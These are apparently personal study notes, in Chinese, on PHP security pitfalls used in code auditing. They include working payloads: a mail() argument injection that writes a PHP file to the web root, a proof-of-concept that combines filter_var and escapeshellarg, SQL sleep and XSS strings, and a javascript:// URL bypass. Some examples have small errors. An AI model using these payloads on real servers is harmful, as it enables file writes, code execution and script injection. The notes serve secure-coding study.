#### in_array

* `bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` php8之前默认是弱类型比较

```php
$whitelist = ['admin', 'user', 'guest'];
var_dump(in_array(0, $whitelist)); // true (！！！危险)

$files = ['image.jpg', 'video.mp4'];
var_dump(in_array(true, $files)); // true (！！！危险)

$whitelist = [0,1,2,3,4];
var_dump(in_array("1'||sleep(3) --", $files)); // true (！！！危险)
```

#### 实例化任意类与class_exists() _autoload

* 默认情况下，如果程序存在 **__autoload** 函数，那么在使用 **class_exists()** 函数就会自动调用本程序中的 **__autoload** 函数
* 如果允许实例化任意类，即使没有危险类，也可以通过实例化**SimpleXMLElement**进行XXE

#### strpos

* strpos返回的0和false易混淆

```php
var_dump(strpos('abcd','a'));  # 0
var_dump(strpos('abcd','x'));  # false
```

#### parse_str变量覆盖

* php7.2警告,8.0废弃

```php
$id = 1;
parse_str("id=20"); 
echo $id; // 输出 20

# 安全用法
parse_str($input, $output_array);
// 变量被存储在 $output_array['id'] 中，不会污染全局作用域。
```

#### filter_var

##### XSS绕过filter_var(input, FILTER_VALIDATE_URL)

```php
# %0a换行绕过注释
var_dump(filter_var('javascript://alert(123)%0aalert(123)', FILTER_VALIDATE_URL));
```


#### escapeshellcmd(escapeshellarg($input))链式反应

* `escapeshellcmd`的作用是对字符串中可能用于执行多个命令的特殊字符前添加反斜杠 `\` 进行转义。反斜线（\）会在以下字符之前插入：`&#;`|*?~<>^()[]{}$\`、`\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符前面都有一个插入符号（`^`）。
* `escapeshellarg`的作用是将整个字符串用单引号包围，并对字符串内部原有的单引号进行转义（例如转换成 `'\''`）。这确保了传入的内容在 Bash 等 Shell 眼里是一个**不可分割的独立字符串**。
* 总结
  * escapeshellcmd(escapeshellarg($input))会破坏escapeshellarg的转义功能
  * escapeshellarg某些情况下无法防止参数注入，这取决于二进制程序如何理解参数。
  
  ```php
  $dir = '-l';
  system("ls -l " . escapeshellarg($dir));
  # 执行结果是ls -l '-a'，ls支持-l '-a'这样传入参数
  ```
  
  * escapeshellarg容易被一些字符编码扭曲，造成单引号无法括起整个$input

#### mail

```php
<?php
	$to = 'Alice@example.com';
    $subject = 'Hello Alice!';
    $message='<?php phpinfo(); ?>';
    $headers = "cc: somebodyelse@example.com";
    $options = '-oQueueDirectory=/tmp -X /var/www/html/rce.php';
    mail($to, $subject, $message,$headers, $options);
?>
```

* option参数可控，非常危险

##### mail底层调用

PHP `mail()` 函数的行为取决于运行的**操作系统**以及 `php.ini` 中的配置：

- **Unix/Linux 系统（核心风险点）：** 在 Linux 下，`mail()` 默认**确实是调用命令行**。它会读取 `php.ini` 中的 `sendmail_path` 配置（通常是 `/usr/sbin/sendmail -t -i`）。 当你调用 `mail()` 时，PHP 会启动一个进程，通过管道（Pipe）将邮件内容写入该程序的标准输入。这就是为什么它极其容易受到命令注入攻击的原因。后续讨论主要关于linux下的注入。
- **Windows 系统：** 在 Windows 下，`mail()` 通常不调用命令行，而是直接通过 **SMTP 协议**与远程或本地服务器通信。虽然这避免了命令注入，但依然存在**邮件头注入（Header Injection）**的风险。

##### From注入

* 发生邮件时，需要通过From设置发送者的邮件地址，在mail函数中有两种配置

  * $headers部分传入 "From: xxx@xx.com"，易受`\r\rn`注入的影响注入额外Header，

  ```php
  mail($to, $subject, $message, "From: " . $user_input);
  ```

  

  * $option部分传入`-f.input`，如果注入额外参数，易造成参数注入，写入任意文件

  ```php
  mail($to, $subject, $message, $headers, "-f" . $user_input);
  ```

##### escapeshellcmd(escapeshellarg(filter_var($input, FILTER_VALIDATE_EMAIL)))

* mail底层实现了类似escapeshellcmd的转义函数，如果有以下代码，如何利用

```php
$input=$_GET['payload'];
$input=filter_var($input,FILTER_VALIDATE_EMAIL);
$input=escapeshellarg($input);
mail($to, $subject, $message, $headers, "-f".$user_input)
```

```php
<?php
    $from_payload='a."\'\ -OQueueDirectory=/tmp\ -X/tmp/backdoor.php\ \'"@a.com';
    $to = 'Alice@example.com';
    $subject = 'Hello Alice!';
    $message='<?php phpinfo(); ?>';
    $headers = "cc: somebodyelse@example.com";
    $options = '-oQueueDirectory=/tmp -X /var/www/html/rce.php';
    
    $payload=escapeshellarg(filter_var($from_payload,FILTER_VALIDATE_EMAIL));
    var_dump($payload);
    $result = mail($to, $subject, $message, $headers, "-f" . $payload);
if ($result === false) {
    echo "PHP Error: mail() returned FALSE.\n";
    // 打印最后一次发生的错误
    print_r(error_get_last());
} else {
    echo "PHP Success: mail() reported success.\n";
}
```

这里成功利用邮箱的标准格式和escapeshellcmd与email的底层escapeshellarg堆叠，成功注入参数`-X`

![image-20260325154427921](.\images\jietu.png)

但是这里由于filter_var的限制，无法成功写入.php文件，要是过滤不太严格，能控制文件后缀则可以写入.php文件

#### preg_replace /e命令执行

#### 程序未恰当exit

* 常见于CMS的安装代码或者防御代码，在检测到恶意攻击或者安装命令后，仅重定向代码，而不exit，实际上后续危险代码仍会进行操作

#### $_SERVER['PHP_SELF']易导致XSS

```php
# 访问 http://example.com/index.php/"><script>alert('XSS')</script>，实际访问的是index.php脚本
$_SERVER['PHP_SELF'] # 获取到的值为/index.php/"><script>alert('XSS')</script>，应使用$_SERVER['SCRIPT_NAME']代替
```

#### md5(xxx,true)造成SQL注入
